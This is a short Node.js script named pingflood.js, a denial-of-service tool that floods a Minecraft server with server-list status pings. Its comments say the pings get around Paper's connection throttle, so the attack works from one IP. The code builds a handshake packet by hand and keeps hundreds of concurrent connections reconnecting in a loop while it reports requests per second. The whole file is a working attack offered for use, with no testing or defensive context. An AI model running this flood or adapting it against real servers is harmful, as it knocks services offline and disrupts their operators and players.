// pingflood.js <host> <port> <concurrency>
// Server-list-ping flood. Status pings bypass Paper's connection-throttle,
// so this works from a single IP. Burns handshake parsing + JSON serialisation.
const net = require('net');

const HOST = process.argv[2];
const PORT = +process.argv[3];
const CONC = +(process.argv[4] || 400);
const PROTO = 774;

const varint = n => {
  const o = []; n >>>= 0;
  do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; o.push(b); } while (n);
  return Buffer.from(o);
};
const frame = p => Buffer.concat([varint(p.length), p]);

const addr = Buffer.from(HOST);
const port = Buffer.alloc(2);
port.writeUInt16BE(PORT);
const BUF = Buffer.concat([
  frame(Buffer.concat([
    varint(0), varint(PROTO), varint(addr.length), addr, port, varint(1)
  ])),
  frame(Buffer.from([0]))
]);

let sent = 0, errs = 0;
setInterval(() => { console.log(`rps=${sent} errors=${errs}`); sent = 0; errs = 0; }, 1000);

function spawn() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false;
  const next = () => { if (done) return; done = true; s.destroy(); spawn(); };

  s.setNoDelay(true);
  s.on('connect', () => { s.write(BUF); sent++; });
  s.on('data', next);
  s.on('error', () => { errs++; next(); });
  s.setTimeout(3000, next);
}

for (let i = 0; i < CONC; i++) spawn();